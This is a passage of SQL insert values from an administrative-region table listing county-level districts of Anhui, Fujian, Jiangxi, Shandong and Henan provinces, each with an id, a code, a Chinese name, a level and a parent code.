(1540, '1340599', '其他区县', 3, '1510', 0),
(1541, '1340605', '南湖开发区', 3, '1502', 0),
(1542, '1340601', '相山区', 3, '1502', 0),
(1543, '1340602', '杜集区', 3, '1502', 0),
(1544, '1340603', '烈山区', 3, '1502', 0),
(1545, '1340604', '濉溪县', 3, '1502', 0),
(1546, '1340699', '其他区县', 3, '1502', 0),
(1547, '1340701', '铜官山区', 3, '1514', 0),
(1548, '1340702', '狮子山区', 3, '1514', 0),
(1549, '1340703', '郊区', 3, '1514', 0),
(1550, '1340704', '铜陵县', 3, '1514', 0),
(1551, '1340799', '其他区县', 3, '1514', 0),
(1552, '1340814', '开发区', 3, '1516', 0),
(1553, '1340801', '迎江区', 3, '1516', 0),
(1554, '1340802', '大观区', 3, '1516', 0),
(1555, '1340804', '桐城市', 3, '1516', 0),
(1556, '1340805', '怀宁县', 3, '1516', 0),
(1557, '1340806', '枞阳县', 3, '1516', 0),
(1558, '1340807', '潜山县', 3, '1516', 0),
(1559, '1340808', '太湖县', 3, '1516', 0),
(1560, '1340809', '宿松县', 3, '1516', 0),
(1561, '1340810', '望江县', 3, '1516', 0),
(1562, '1340811', '岳西县', 3, '1516', 0),
(1563, '1340813', '宜秀区', 3, '1516', 0),
(1564, '1340899', '其他区县', 3, '1516', 0),
(1565, '1340901', '屯溪区', 3, '1507', 0),
(1566, '1340902', '黄山区', 3, '1507', 0),
(1567, '1340903', '徽州区', 3, '1507', 0),
(1568, '1340904', '歙县', 3, '1507', 0),
(1569, '1340905', '休宁县', 3, '1507', 0),
(1570, '1340906', '黟县', 3, '1507', 0),
(1571, '1340907', '祁门县', 3, '1507', 0),
(1572, '1340999', '其他区县', 3, '1507', 0),
(1573, '1341009', '经济开发区', 3, '1505', 0),
(1574, '1341010', '扬子工业开发区', 3, '1505', 0),
(1575, '1341001', '琅琊区', 3, '1505', 0),
(1576, '1341002', '南谯区', 3, '1505', 0),
(1577, '1517', '明光市', 3, '1505', 0),
(1578, '1341004', '天长市', 3, '1505', 0),
(1579, '1341005', '来安县', 3, '1505', 0),
(1580, '1341006', '全椒县', 3, '1505', 0),
(1581, '1341007', '定远县', 3, '1505', 0),
(1582, '1341008', '凤阳县', 3, '1505', 0),
(1583, '1341099', '其他区县', 3, '1505', 0),
(1584, '1341101', '颍州区', 3, '1513', 0),
(1585, '1341102', '颍东区', 3, '1513', 0),
(1586, '1341103', '颍泉区', 3, '1513', 0),
(1587, '1341104', '界首市', 3, '1513', 0),
(1588, '1341105', '临泉县', 3, '1513', 0),
(1589, '1341106', '太和县', 3, '1513', 0),
(1590, '1341107', '阜南县', 3, '1513', 0),
(1591, '1341108', '颍上县', 3, '1513', 0),
(1592, '1341199', '其他区县', 3, '1513', 0),
(1593, '1341109', '经济技术开发区', 3, '1513', 0),
(1594, '1341306', '民营开发区', 3, '1511', 0),
(1595, '1341301', '居巢区', 3, '1511', 0),
(1596, '1341302', '庐江县', 3, '1511', 0),
(1597, '1341303', '无为县', 3, '1511', 0),
(1598, '1341304', '含山县', 3, '1511', 0),
(1599, '1341305', '和县', 3, '1511', 0),
(1600, '1341399', '其他区县', 3, '1511', 0),
(1601, '1341408', '经济开发区', 3, '1521', 0),
(1602, '1341401', '金安区', 3, '1521', 0),
(1603, '1341402', '裕安区', 3, '1521', 0),
(1604, '1341403', '寿县', 3, '1521', 0),
(1605, '1341404', '霍邱县', 3, '1521', 0),
(1606, '1341405', '舒城县', 3, '1521', 0),
(1607, '1341406', '金寨县', 3, '1521', 0),
(1608, '1341407', '霍山县', 3, '1521', 0),
(1609, '1341499', '其他区县', 3, '1521', 0),
(1610, '1341501', '谯城区', 3, '1504', 0),
(1611, '1341502', '涡阳县', 3, '1504', 0),
(1612, '1341503', '蒙城县', 3, '1504', 0),
(1613, '1341504', '利辛县', 3, '1504', 0),
(1614, '1341599', '其他区县', 3, '1504', 0),
(1615, '1512', '贵池区', 3, '1519', 0),
(1616, '1341602', '东至县', 3, '1519', 0),
(1617, '1341603', '石台县', 3, '1519', 0),
(1618, '1341604', '青阳县', 3, '1519', 0),
(1619, '1341699', '其他区县', 3, '1519', 0),
(1620, '1341701', '宣州区', 3, '1515', 0),
(1621, '1341702', '宁国市', 3, '1515', 0),
(1622, '1341703', '郎溪县', 3, '1515', 0),
(1623, '1341704', '广德县', 3, '1515', 0),
(1624, '1341705', '泾县', 3, '1515', 0),
(1625, '1341706', '旌德县', 3, '1515', 0),
(1626, '1341707', '绩溪县', 3, '1515', 0),
(1627, '1341799', '其他区县', 3, '1515', 0),
(1628, '1350101', '鼓楼区', 3, '2101', 0),
(1629, '1350102', '台江区', 3, '2101', 0),
(1630, '1350103', '仓山区', 3, '2101', 0),
(1631, '1350104', '马尾区', 3, '2101', 0),
(1632, '1350105', '晋安区', 3, '2101', 0),
(1633, '2111', '福清市', 3, '2101', 0),
(1634, '2120', '长乐市', 3, '2101', 0),
(1635, '2122', '闽侯县', 3, '2101', 0),
(1636, '2116', '连江县', 3, '2101', 0),
(1637, '2121', '罗源县', 3, '2101', 0),
(1638, '2123', '闽清县', 3, '2101', 0),
(1639, '2124', '永泰县', 3, '2101', 0),
(1640, '2125', '平潭县', 3, '2101', 0),
(1641, '1350199', '其他区县', 3, '2101', 0),
(1642, '1350201', '思明区', 3, '2105', 0),
(1643, '1350202', '海沧区', 3, '2105', 0),
(1644, '1350203', '湖里区', 3, '2105', 0),
(1645, '1350204', '集美区', 3, '2105', 0),
(1646, '1350205', '同安区', 3, '2105', 0),
(1647, '1350206', '翔安区', 3, '2105', 0),
(1648, '1350299', '其他区县', 3, '2105', 0),
(1649, '1350301', '城厢区', 3, '2103', 0),
(1650, '1350302', '涵江区', 3, '2103', 0),
(1651, '1350303', '荔城区', 3, '2103', 0),
(1652, '1350304', '秀屿区', 3, '2103', 0),
(1653, '1350305', '仙游县', 3, '2103', 0),
(1654, '1350399', '其他区县', 3, '2103', 0),
(1655, '1350401', '梅列区', 3, '2102', 0),
(1656, '1350402', '三元区', 3, '2102', 0),
(1657, '2126', '永安市', 3, '2102', 0),
(1658, '2134', '明溪县', 3, '2102', 0),
(1659, '2130', '清流县', 3, '2102', 0),
(1660, '2131', '宁化县', 3, '2102', 0),
(1661, '2128', '大田县', 3, '2102', 0),
(1662, '2129', '尤溪县', 3, '2102', 0),
(1663, '2127', '沙县', 3, '2102', 0),
(1664, '2133', '将乐县', 3, '2102', 0),
(1665, '2117', '泰宁县', 3, '2102', 0),
(1666, '2132', '建宁县', 3, '2102', 0),
(1667, '1350499', '其他区县', 3, '2102', 0),
(1668, '1350501', '丰泽区', 3, '2104', 0),
(1669, '1350502', '鲤城区', 3, '2104', 0),
(1670, '1350503', '洛江区', 3, '2104', 0),
(1671, '1350504', '泉港区', 3, '2104', 0),
(1672, '2112', '石狮市', 3, '2104', 0),
(1673, '2115', '晋江市', 3, '2104', 0),
(1674, '1350507', '南安市', 3, '2104', 0),
(1675, '1350508', '惠安县', 3, '2104', 0),
(1676, '1350509', '安溪县', 3, '2104', 0),
(1677, '1350510', '永春县', 3, '2104', 0),
(1678, '1350511', '德化县', 3, '2104', 0),
(1679, '1350512', '金门县', 3, '2104', 0),
(1680, '1350599', '其他区县', 3, '2104', 0),
(1681, '1350601', '芗城区', 3, '2106', 0),
(1682, '1350602', '龙文区', 3, '2106', 0),
(1683, '1350603', '龙海市', 3, '2106', 0),
(1684, '1350604', '云霄县', 3, '2106', 0),
(1685, '1350605', '漳浦县', 3, '2106', 0),
(1686, '1350606', '诏安县', 3, '2106', 0),
(1687, '1350607', '长泰县', 3, '2106', 0),
(1688, '1350608', '东山县', 3, '2106', 0),
(1689, '2118', '南靖县', 3, '2106', 0),
(1690, '2119', '平和县', 3, '2106', 0),
(1691, '1350611', '华安县', 3, '2106', 0),
(1692, '1350699', '其他区县', 3, '2106', 0),
(1693, '1350701', '延平区', 3, '2107', 0),
(1694, '1350702', '邵武市', 3, '2107', 0),
(1695, '2114', '武夷山市', 3, '2107', 0),
(1696, '2108', '建瓯市', 3, '2107', 0),
(1697, '1350705', '建阳市', 3, '2107', 0),
(1698, '1350706', '顺昌县', 3, '2107', 0),
(1699, '1350707', '浦城县', 3, '2107', 0),
(1700, '1350708', '光泽县', 3, '2107', 0),
(1701, '1350709', '松溪县', 3, '2107', 0),
(1702, '1350710', '政和县', 3, '2107', 0),
(1703, '1350799', '其他区县', 3, '2107', 0),
(1704, '1350801', '新罗区', 3, '2113', 0),
(1705, '2135', '漳平市', 3, '2113', 0),
(1706, '2137', '长汀县', 3, '2113', 0),
(1707, '1350804', '永定县', 3, '2113', 0),
(1708, '2136', '上杭县', 3, '2113', 0),
(1709, '1350806', '武平县', 3, '2113', 0),
(1710, '2138', '连城县', 3, '2113', 0),
(1711, '1350899', '其他区县', 3, '2113', 0),
(1712, '1350901', '蕉城区', 3, '2109', 0),
(1713, '1350902', '福安市', 3, '2109', 0),
(1714, '2110', '福鼎市', 3, '2109', 0),
(1715, '1350904', '寿宁县', 3, '2109', 0),
(1716, '1350905', '霞浦县', 3, '2109', 0),
(1717, '1350906', '柘荣县', 3, '2109', 0),
(1718, '1350907', '屏南县', 3, '2109', 0),
(1719, '1350908', '古田县', 3, '2109', 0),
(1720, '1350909', '周宁县', 3, '2109', 0),
(1721, '1350999', '其他区县', 3, '2109', 0),
(1722, '1360101', '东湖区', 3, '2001', 0),
(1723, '1360102', '西湖区', 3, '2001', 0),
(1724, '1360103', '青云谱区', 3, '2001', 0),
(1725, '2015', '湾里区', 3, '2001', 0),
(1726, '1360105', '青山湖区', 3, '2001', 0),
(1727, '2014', '南昌县', 3, '2001', 0),
(1728, '2016', '新建县', 3, '2001', 0),
(1729, '1360108', '安义县', 3, '2001', 0),
(1730, '1360109', '进贤县', 3, '2001', 0),
(1731, '1360199', '其他区县', 3, '2001', 0),
(1732, '1360110', '高新技术开发区', 3, '2001', 0),
(1733, '1360111', '红谷滩新区', 3, '2001', 0),
(1734, '1360112', '昌北经济技术开发区', 3, '2001', 0),
(1735, '1360201', '珠山区', 3, '2003', 0),
(1736, '1360202', '昌江区', 3, '2003', 0),
(1737, '1360203', '乐平市', 3, '2003', 0),
(1738, '1360204', '浮梁县', 3, '2003', 0),
(1739, '1360299', '其他区县', 3, '2003', 0),
(1740, '1360301', '安源区', 3, '2006', 0),
(1741, '1360302', '湘东区', 3, '2006', 0),
(1742, '1360303', '莲花县', 3, '2006', 0),
(1743, '1360304', '上栗县', 3, '2006', 0),
(1744, '1360305', '芦溪县', 3, '2006', 0),
(1745, '1360399', '其他区县', 3, '2006', 0),
(1746, '1360401', '浔阳区', 3, '2002', 0),
(1747, '1360402', '庐山区', 3, '2002', 0),
(1748, '1360403', '瑞昌市', 3, '2002', 0),
(1749, '1360404', '九江县', 3, '2002', 0),
(1750, '1360405', '武宁县', 3, '2002', 0),
(1751, '1360406', '修水县', 3, '2002', 0),
(1752, '1360407', '永修县', 3, '2002', 0),
(1753, '1360408', '德安县', 3, '2002', 0),
(1754, '1360409', '星子县', 3, '2002', 0),
(1755, '1360410', '都昌县', 3, '2002', 0),
(1756, '1360411', '湖口县', 3, '2002', 0),
(1757, '1360412', '彭泽县', 3, '2002', 0),
(1758, '1360499', '其他区县', 3, '2002', 0),
(1759, '1360501', '渝水区', 3, '2005', 0),
(1760, '1360502', '分宜县', 3, '2005', 0),
(1761, '1360599', '其他区县', 3, '2005', 0),
(1762, '1360601', '月湖区', 3, '2004', 0),
(1763, '2013', '贵溪市', 3, '2004', 0),
(1764, '1360603', '余江县', 3, '2004', 0),
(1765, '1360699', '其他区县', 3, '2004', 0),
(1766, '1360701', '章贡区', 3, '2008', 0),
(1767, '1360702', '瑞金市', 3, '2008', 0),
(1768, '1360703', '南康市', 3, '2008', 0),
(1769, '1360704', '赣县', 3, '2008', 0),
(1770, '1360705', '信丰县', 3, '2008', 0),
(1771, '1360706', '大余县', 3, '2008', 0),
(1772, '1360707', '上犹县', 3, '2008', 0),
(1773, '1360708', '崇义县', 3, '2008', 0),
(1774, '1360709', '安远县', 3, '2008', 0),
(1775, '1360710', '龙南县', 3, '2008', 0),
(1776, '1360711', '定南县', 3, '2008', 0),
(1777, '1360712', '全南县', 3, '2008', 0),
(1778, '1360713', '宁都县', 3, '2008', 0),
(1779, '1360714', '于都县', 3, '2008', 0),
(1780, '1360715', '兴国县', 3, '2008', 0),
(1781, '1360716', '会昌县', 3, '2008', 0),
(1782, '1360717', '寻乌县', 3, '2008', 0),
(1783, '1360718', '石城县', 3, '2008', 0),
(1784, '1360799', '其他区县', 3, '2008', 0),
(1785, '1360801', '吉州区', 3, '2007', 0),
(1786, '1360802', '青原区', 3, '2007', 0),
(1787, '2010', '井冈山市', 3, '2007', 0),
(1788, '1360804', '吉安县', 3, '2007', 0),
(1789, '1360805', '吉水县', 3, '2007', 0),
(1790, '1360806', '峡江县', 3, '2007', 0),
(1791, '1360807', '新干县', 3, '2007', 0),
(1792, '1360808', '永丰县', 3, '2007', 0),
(1793, '1360809', '泰和县', 3, '2007', 0),
(1794, '1360810', '遂川县', 3, '2007', 0),
(1795, '1360811', '万安县', 3, '2007', 0),
(1796, '1360812', '安福县', 3, '2007', 0),
(1797, '1360813', '永新县', 3, '2007', 0),
(1798, '1360899', '其他区县', 3, '2007', 0),
(1799, '1360901', '袁州区', 3, '2012', 0),
(1800, '1360902', '丰城市', 3, '2012', 0),
(1801, '1360903', '樟树市', 3, '2012', 0),
(1802, '1360904', '高安市', 3, '2012', 0),
(1803, '1360905', '奉新县', 3, '2012', 0),
(1804, '1360906', '万载县', 3, '2012', 0),
(1805, '1360907', '上高县', 3, '2012', 0),
(1806, '1360908', '宜丰县', 3, '2012', 0),
(1807, '1360909', '靖安县', 3, '2012', 0),
(1808, '1360910', '铜鼓县', 3, '2012', 0),
(1809, '1360999', '其他区县', 3, '2012', 0),
(1810, '1361001', '临川区', 3, '2009', 0),
(1811, '1361002', '南城县', 3, '2009', 0),
(1812, '1361003', '黎川县', 3, '2009', 0),
(1813, '1361004', '南丰县', 3, '2009', 0),
(1814, '1361005', '崇仁县', 3, '2009', 0),
(1815, '1361006', '乐安县', 3, '2009', 0),
(1816, '1361007', '宜黄县', 3, '2009', 0),
(1817, '1361008', '金溪县', 3, '2009', 0),
(1818, '1361009', '资溪县', 3, '2009', 0),
(1819, '1361010', '东乡县', 3, '2009', 0),
(1820, '1361011', '广昌县', 3, '2009', 0),
(1821, '1361099', '其他区县', 3, '2009', 0),
(1822, '1361101', '信州区', 3, '2011', 0),
(1823, '1361102', '德兴市', 3, '2011', 0),
(1824, '1361103', '上饶县', 3, '2011', 0),
(1825, '1361104', '广丰县', 3, '2011', 0),
(1826, '1361105', '玉山县', 3, '2011', 0),
(1827, '1361106', '铅山县', 3, '2011', 0),
(1828, '1361107', '横峰县', 3, '2011', 0),
(1829, '1361108', '弋阳县', 3, '2011', 0),
(1830, '1361109', '余干县', 3, '2011', 0),
(1831, '1361110', '鄱阳县', 3, '2011', 0),
(1832, '1361111', '万年县', 3, '2011', 0),
(1833, '1361112', '婺源县', 3, '2011', 0),
(1834, '1361199', '其他区县', 3, '2011', 0),
(1835, '1370111', '高新区', 3, '1101', 0),
(1836, '1370101', '市中区', 3, '1101', 0),
(1837, '1370102', '历下区', 3, '1101', 0),
(1838, '1370103', '槐荫区', 3, '1101', 0),
(1839, '1370104', '天桥区', 3, '1101', 0),
(1840, '1370105', '历城区', 3, '1101', 0),
(1841, '1370106', '长清区', 3, '1101', 0),
(1842, '1370107', '章丘市', 3, '1101', 0),
(1843, '1370108', '平阴县', 3, '1101', 0),
(1844, '1370109', '济阳县', 3, '1101', 0),
(1845, '1370110', '商河县', 3, '1101', 0),
(1846, '1370199', '其他区县', 3, '1101', 0),
(1847, '1370201', '市南区', 3, '1106', 0),
(1848, '1370202', '市北区', 3, '1106', 0),
(1849, '1370203', '四方区', 3, '1106', 0),
(1850, '1370204', '黄岛区', 3, '1106', 0),
(1851, '1370205', '崂山区', 3, '1106', 0),
(1852, '1370206', '城阳区', 3, '1106', 0),
(1853, '1370207', '李沧区', 3, '1106', 0),
(1854, '1370208', '胶州市', 3, '1106', 0),
(1855, '1116', '即墨市', 3, '1106', 0),
(1856, '1370210', '平度市', 3, '1106', 0),
(1857, '1370211', '胶南市', 3, '1106', 0),
(1858, '1370212', '莱西市', 3, '1106', 0),
(1859, '1370299', '其他区县', 3, '1106', 0),
(1860, '1370301', '张店区', 3, '1104', 0),
(1861, '1370302', '淄川区', 3, '1104', 0),
(1862, '1370303', '博山区', 3, '1104', 0),
(1863, '1370304', '临淄区', 3, '1104', 0),
(1864, '1370305', '周村区', 3, '1104', 0),
(1865, '1370306', '桓台县', 3, '1104', 0),
(1866, '1370307', '高青县', 3, '1104', 0),
(1867, '1370308', '沂源县', 3, '1104', 0),
(1868, '1370399', '其他区县', 3, '1104', 0),
(1869, '1370401', '市中区', 3, '13704', 0),
(1870, '1370402', '薛城区', 3, '13704', 0),
(1871, '1370403', '峄城区', 3, '13704', 0),
(1872, '1370404', '台儿庄区', 3, '13704', 0),
(1873, '1370405', '山亭区', 3, '13704', 0),
(1874, '1370406', '滕州市', 3, '13704', 0),
(1875, '1370499', '其他区县', 3, '13704', 0),
(1876, '1370501', '东营区', 3, '1105', 0),
(1877, '1370502', '河口区', 3, '1105', 0),
(1878, '1370503', '垦利县', 3, '1105', 0),
(1879, '1370504', '利津县', 3, '1105', 0),
(1880, '1370505', '广饶县', 3, '1105', 0),
(1881, '1370599', '其他区县', 3, '1105', 0),
(1882, '1370613', '开发区', 3, '1110', 0),
(1883, '1370601', '莱山区', 3, '1110', 0),
(1884, '1370602', '芝罘区', 3, '1110', 0),
(1885, '1370603', '福山区', 3, '1110', 0),
(1886, '1370604', '牟平区', 3, '1110', 0),
(1887, '1370605', '栖霞市', 3, '1110', 0),
(1888, '1370606', '海阳市', 3, '1110', 0),
(1889, '1370607', '龙口市', 3, '1110', 0),
(1890, '1111', '莱阳市', 3, '1110', 0),
(1891, '1370609', '莱州市', 3, '1110', 0),
(1892, '1370610', '蓬莱市', 3, '1110', 0),
(1893, '1114', '招远市', 3, '1110', 0),
(1894, '1370612', '长岛县', 3, '1110', 0),
(1895, '1370699', '其他区县', 3, '1110', 0),
(1896, '1370801', '潍城区', 3, '1103', 0),
(1897, '1370802', '寒亭区', 3, '1103', 0),
(1898, '1370803', '坊子区', 3, '1103', 0),
(1899, '1370804', '奎文区', 3, '1103', 0),
(1900, '1370805', '安丘市', 3, '1103', 0),
(1901, '1370806', '昌邑市', 3, '1103', 0),
(1902, '1370807', '高密市', 3, '1103', 0),
(1903, '1370808', '青州市', 3, '1103', 0),
(1904, '1370809', '诸城市', 3, '1103', 0),
(1905, '1370810', '寿光市', 3, '1103', 0),
(1906, '1370811', '临朐县', 3, '1103', 0),
(1907, '1370812', '昌乐县', 3, '1103', 0),
(1908, '1370899', '其他区县', 3, '1103', 0),
(1909, '1370905', '高新技术产业开发区', 3, '1113', 0),
(1910, '1370901', '环翠区', 3, '1113', 0),
(1911, '1370902', '文登市', 3, '1113', 0),
(1912, '1370903', '荣成市', 3, '1113', 0),
(1913, '1370904', '乳山市', 3, '1113', 0),
(1914, '1370999', '其他区县', 3, '1113', 0),
(1915, '1371001', '市中区', 3, '13710', 0),
(1916, '1371002', '任城区', 3, '13710', 0),
(1917, '1371003', '曲阜市', 3, '13710', 0),
(1918, '1371004', '兖州市', 3, '13710', 0),
(1919, '1371005', '邹城市', 3, '13710', 0),
(1920, '1371006', '微山县', 3, '13710', 0),
(1921, '1371007', '鱼台县', 3, '13710', 0),
(1922, '1371008', '金乡县', 3, '13710', 0),
(1923, '1371009', '嘉祥县', 3, '13710', 0),
(1924, '1371010', '汶上县', 3, '13710', 0),
(1925, '1371011', '泗水县', 3, '13710', 0),
(1926, '1371012', '梁山县', 3, '13710', 0),
(1927, '1371099', '其他区县', 3, '13710', 0),
(1928, '1371101', '泰山区', 3, '13711', 0),
(1929, '1371102', '岱岳区', 3, '13711', 0),
(1930, '1371103', '新泰市', 3, '13711', 0),
(1931, '1371104', '肥城市', 3, '13711', 0),
(1932, '1371105', '宁阳县', 3, '13711', 0),
(1933, '1371106', '东平县', 3, '13711', 0),
(1934, '1371199', '其他区县', 3, '13711', 0),
(1935, '1371205', '开发区', 3, '1108', 0),
(1936, '1371201', '东港区', 3, '1108', 0),
(1937, '1371202', '岚山区', 3, '1108', 0),
(1938, '1371203', '五莲县', 3, '1108', 0),
(1939, '1371204', '莒县', 3, '1108', 0),
(1940, '1371299', '其他区县', 3, '1108', 0),
(1941, '1371303', '开发区', 3, '1112', 0),
(1942, '1371301', '莱城区', 3, '1112', 0),
(1943, '1371302', '钢城区', 3, '1112', 0),
(1944, '1371399', '其他区县', 3, '1112', 0),
(1945, '1371401', '兰山区', 3, '1107', 0),
(1946, '1371402', '罗庄区', 3, '1107', 0),
(1947, '1371403', '河东区', 3, '1107', 0),
(1948, '1371404', '郯城县', 3, '1107', 0),
(1949, '1371405', '苍山县', 3, '1107', 0),
(1950, '1371406', '莒南县', 3, '1107', 0),
(1951, '1371407', '沂水县', 3, '1107', 0),
(1952, '1371408', '蒙阴县', 3, '1107', 0),
(1953, '1371409', '平邑县', 3, '1107', 0),
(1954, '1371410', '费县', 3, '1107', 0),
(1955, '1371411', '沂南县', 3, '1107', 0),
(1956, '1371412', '临沭县', 3, '1107', 0),
(1957, '1371499', '其他区县', 3, '1107', 0),
(1958, '1371501', '德城区', 3, '1102', 0),
(1959, '1371502', '乐陵市', 3, '1102', 0),
(1960, '1371503', '禹城市', 3, '1102', 0),
(1961, '1371504', '陵县', 3, '1102', 0),
(1962, '1371505', '平原县', 3, '1102', 0),
(1963, '1371506', '夏津县', 3, '1102', 0),
(1964, '1371507', '武城县', 3, '1102', 0),
(1965, '1371508', '齐河县', 3, '1102', 0),
(1966, '1371509', '临邑县', 3, '1102', 0),
(1967, '1371510', '宁津县', 3, '1102', 0),
(1968, '1371511', '庆云县', 3, '1102', 0),
(1969, '1371599', '其他区县', 3, '1102', 0),
(1970, '1371601', '东昌府区', 3, '1115', 0),
(1971, '1371602', '临清市', 3, '1115', 0),
(1972, '1371603', '阳谷县', 3, '1115', 0),
(1973, '1371604', '莘县', 3, '1115', 0),
(1974, '1371605', '茌平县', 3, '1115', 0),
(1975, '1371606', '东阿县', 3, '1115', 0),
(1976, '1371607', '冠县', 3, '1115', 0),
(1977, '1371608', '高唐县', 3, '1115', 0),
(1978, '1371699', '其他区县', 3, '1115', 0),
(1979, '1371701', '滨城区', 3, '1109', 0),
(1980, '1371702', '惠民县', 3, '1109', 0),
(1981, '1371703', '阳信县', 3, '1109', 0),
(1982, '1371704', '无棣县', 3, '1109', 0),
(1983, '1371705', '沾化县', 3, '1109', 0),
(1984, '1371706', '博兴县', 3, '1109', 0),
(1985, '1371707', '邹平县', 3, '1109', 0),
(1986, '1371799', '其他区县', 3, '1109', 0),
(1987, '1371801', '牡丹区', 3, '13718', 0),
(1988, '1371802', '曹县', 3, '13718', 0),
(1989, '1371803', '定陶县', 3, '13718', 0),
(1990, '1371804', '成武县', 3, '13718', 0),
(1991, '1371805', '单县', 3, '13718', 0),
(1992, '1371806', '巨野县', 3, '13718', 0),
(1993, '1371807', '郓城县', 3, '13718', 0),
(1994, '1371808', '鄄城县', 3, '13718', 0),
(1995, '1371809', '东明县', 3, '13718', 0),
(1996, '1371899', '其他区县', 3, '13718', 0),
(1997, '1410115', '高新技术开发区', 3, '1401', 0),
(1998, '1410114', '经济技术开发区', 3, '1401', 0),
(1999, '1410113', '郑东新区', 3, '1401', 0),
(2000, '1410101', '中原区', 3, '1401', 0),
(2001, '1410102', '二七区', 3, '1401', 0),
(2002, '1410103', '管城回族区', 3, '1401', 0),
(2003, '1410104', '金水区', 3, '1401', 0),
(2004, '1410105', '上街区', 3, '1401', 0),
(2005, '1410106', '惠济区', 3, '1401', 0),
(2006, '1410107', '新郑市', 3, '1401', 0),
(2007, '1410108', '登封市', 3, '1401', 0),
(2008, '1410109', '新密市', 3, '1401', 0),
(2009, '1410110', '巩义市', 3, '1401', 0),
(2010, '1410111', '荥阳市', 3, '1401', 0),
(2011, '1410112', '中牟县', 3, '1401', 0),
(2012, '1410199', '其他区县', 3, '1401', 0),
(2013, '1410116', '出口加工区', 3, '1401', 0),
(2014, '1410201', '鼓楼区', 3, '1408', 0),
(2015, '1410202', '龙亭区', 3, '1408', 0),
(2016, '1410203', '顺河回族区', 3, '1408', 0),
(2017, '1410204', '禹王台区', 3, '1408', 0),
(2018, '1410205', '金明区', 3, '1408', 0),
(2019, '1410206', '杞县', 3, '1408', 0),
(2020, '1410207', '通许县', 3, '1408', 0),
(2021, '1410208', '尉氏县', 3, '1408', 0),
(2022, '1410209', '开封县', 3, '1408', 0),
(2023, '1410210', '兰考县', 3, '1408', 0),
(2024, '1410299', '其他区县', 3, '1408', 0),
(2025, '1410411', '新城区', 3, '1413', 0),
(2026, '1410401', '新华区', 3, '1413', 0),
(2027, '1410402', '卫东区', 3, '1413', 0),
(2028, '1410403', '湛河区', 3, '1413', 0),
(2029, '1410404', '石龙区', 3, '1413', 0),
(2030, '1410405', '舞钢市', 3, '1413', 0),
(2031, '1410406', '汝州市', 3, '1413', 0),
(2032, '1410407', '宝丰县', 3, '1413', 0),
(2033, '1410408', '叶县', 3, '1413', 0),
(2034, '1410409', '鲁山县', 3, '1413', 0),
(2035, '1410410', '郏县', 3, '1413', 0),
(2036, '1410499', '其他区县', 3, '1413', 0),
(2037, '1410501', '山阳区', 3, '1404', 0),
(2038, '1410502', '解放区', 3, '1404', 0),
(2039, '1410503', '中站区', 3, '1404', 0),
(2040, '1410504', '马村区', 3, '1404', 0),
(2041, '1410505', '孟州市', 3, '1404', 0),
(2042, '1410506', '沁阳市', 3, '1404', 0),
(2043, '1410507', '修武县', 3, '1404', 0),
(2044, '1410508', '博爱县', 3, '1404', 0),
(2045, '1410509', '武陟县', 3, '1404', 0),
(2046, '1410510', '温县', 3, '1404', 0),
(2047, '1410599', '其他区县', 3, '1404', 0),
(2048, '1410601', '淇滨区', 3, '1411', 0),
(2049, '1410602', '山城区', 3, '1411', 0),
(2050, '1410603', '鹤山区', 3, '1411', 0),
(2051, '1410604', '浚县', 3, '1411', 0),
(2052, '1410605', '淇县', 3, '1411', 0),
(2053, '1410699', '其他区县', 3, '1411', 0),
(2054, '1410701', '卫滨区', 3, '1405', 0),
(2055, '1410702', '红旗区', 3, '1405', 0),
(2056, '1410703', '凤泉区', 3, '1405', 0),
(2057, '1410704', '牧野区', 3, '1405', 0),
(2058, '1410705', '卫辉市', 3, '1405', 0),
(2059, '1410706', '辉县市', 3, '1405', 0),
(2060, '1410707', '新乡县', 3, '1405', 0),
(2061, '1410708', '获嘉县', 3, '1405', 0),
(2062, '1410709', '原阳县', 3, '1405', 0),
(2063, '1410710', '延津县', 3, '1405', 0),
(2064, '1410711', '封丘县', 3, '1405', 0),
(2065, '1410712', '长垣县', 3, '1405', 0),
(2066, '1410799', '其他区县', 3, '1405', 0),
(2067, '1410801', '北关区', 3, '1406', 0),
(2068, '1410802', '文峰区', 3, '1406', 0),
(2069, '1410803', '殷都区', 3, '1406', 0),
(2070, '1410804', '龙安区', 3, '1406', 0),
(2071, '1410805', '林州市', 3, '1406', 0),
(2072, '1410806', '安阳县', 3, '1406', 0),
(2073, '1410807', '汤阴县', 3, '1406', 0),
(2074, '1410808', '滑县', 3, '1406', 0),
(2075, '1410809', '内黄县', 3, '1406', 0),
(2076, '1410899', '其他区县', 3, '1406', 0),
(2077, '1410901', '华龙区', 3, '1414', 0),
(2078, '1410902', '清丰县', 3, '1414', 0),
(2079, '1410903', '南乐县', 3, '1414', 0),
(2080, '1410904', '范县', 3, '1414', 0),
(2081, '1410905', '台前县', 3, '1414', 0),
(2082, '1410906', '濮阳县', 3, '1414', 0),
(2083, '1410999', '其他区县', 3, '1414', 0),
(2084, '1411001', '魏都区', 3, '1409', 0),
(2085, '1411002', '禹州市', 3, '1409', 0),
(2086, '1411003', '长葛市', 3, '1409', 0),
(2087, '1411004', '许昌县', 3, '1409', 0),
(2088, '1411005', '鄢陵县', 3, '1409', 0),
(2089, '1411006', '襄城县', 3, '1409', 0),
(2090, '1411099', '其他区县', 3, '1409', 0),
(2091, '1411101', '源汇区', 3, '1407', 0),
(2092, '1411102', '郾城区', 3, '1407', 0),
(2093, '1411103', '召陵区', 3, '1407', 0),
(2094, '1411104', '舞阳县', 3, '1407', 0),
(2095, '1411105', '临颍县', 3, '1407', 0),
(2096, '1411199', '其他区县', 3, '1407', 0),
(2097, '1411201', '湖滨区', 3, '1402', 0),
(2098, '1411202', '义马市', 3, '1402', 0),
(2099, '1411203', '灵宝市', 3, '1402', 0),
(2100, '1411204', '渑池县', 3, '1402', 0),
(2101, '1411205', '陕县', 3, '1402', 0),
(2102, '1411206', '卢氏县', 3, '1402', 0),
(2103, '1411299', '其他区县', 3, '1402', 0),
(2104, '1411314', '南阳油田', 3, '1415', 0),
(2105, '1411301', '卧龙区', 3, '1415', 0),
(2106, '1411302', '宛城区', 3, '1415', 0),
(2107, '1411303', '邓州市', 3, '1415', 0),
(2108, '1411304', '南召县', 3, '1415', 0),
(2109, '1411305', '方城县', 3, '1415', 0),
(2110, '1411306', '西峡县', 3, '1415', 0),
(2111, '1411307', '镇平县', 3, '1415', 0),
(2112, '1411308', '内乡县', 3, '1415', 0),
(2113, '1411309', '淅川县', 3, '1415', 0),
(2114, '1411310', '社旗县', 3, '1415', 0),
(2115, '1411311', '唐河县', 3, '1415', 0),
(2116, '1411312', '新野县', 3, '1415', 0),
(2117, '1411313', '桐柏县', 3, '1415', 0),
